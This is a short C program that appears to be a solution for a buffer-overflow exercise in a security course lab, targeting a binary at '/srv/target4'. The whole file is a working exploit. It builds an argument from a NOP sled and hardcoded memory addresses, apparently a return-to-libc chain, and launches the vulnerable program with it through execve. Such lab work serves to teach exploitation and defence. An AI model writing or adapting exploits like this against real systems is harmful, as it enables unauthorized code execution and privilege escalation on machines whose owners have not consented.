#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

const char* TARGET = "/srv/target4";

const char* SLED = "\x90\x90\x90\x90\x90\x90\x90\x90";
const char* ADD = "\x60\x43\xe1\xf7\xc0\x6e\xe0\xf7\x63\xf3\xf5\xf7";

char* prepB() {
    char* buf = malloc(strlen(SLED) + strlen(ADD) + 1);
    sprintf(buf, "%s%s", SLED, ADD);
    return buf;
}

int main() {
    char *args[3] = {(char*)TARGET, prepB(), NULL};
    char *env[1] = {NULL};

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}
